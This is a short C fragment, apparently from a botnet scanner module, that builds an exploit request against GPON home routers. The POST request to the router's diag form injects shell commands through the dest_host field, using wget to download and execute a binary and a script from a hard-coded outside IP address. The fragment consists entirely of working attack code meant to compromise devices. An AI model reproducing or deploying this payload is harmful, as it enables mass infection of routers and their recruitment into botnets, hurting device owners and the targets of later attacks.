            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    ...
                    if(conn->state == GPON8080_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.237.96.86/xd.arm+0+/tmp/gaf;sh/tmp/gaf+gpon80'&iptv=0;wget http://185.237.96.86/sensi.sh; chmod +x sensi.sh; ./sensi.sh");
